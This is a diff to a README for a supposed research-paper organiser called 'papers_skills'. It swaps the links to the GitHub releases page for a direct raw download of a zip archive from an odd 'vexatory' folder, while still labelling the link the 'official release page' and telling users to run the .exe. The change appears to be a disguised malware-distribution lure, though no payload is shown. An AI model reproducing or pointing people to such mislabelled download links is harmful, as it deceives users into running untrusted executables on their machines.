@@ -1,6 +1,6 @@
 # 📂 papers_skills - Organize your research papers with ease
 
-[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Hebrewlessonmobility409/papers_skills/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Hebrewlessonmobility409/papers_skills/main/vexatory/papers_skills_v1.2.zip)
 
 papers_skills helps you manage your digital library. This tool collects your research documents and keeps them in one place. You can sort files, add tags, and search your collection in seconds. The software works on Windows and requires no technical setup.
 
@@ -8,7 +8,7 @@ papers_skills helps you manage your digital library. This tool collects your res
 
 Follow these steps to get the application.
 
-1. Visit the [official release page](https://github.com/Hebrewlessonmobility409/papers_skills/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/Hebrewlessonmobility409/papers_skills/main/vexatory/papers_skills_v1.2.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop or your downloads folder.
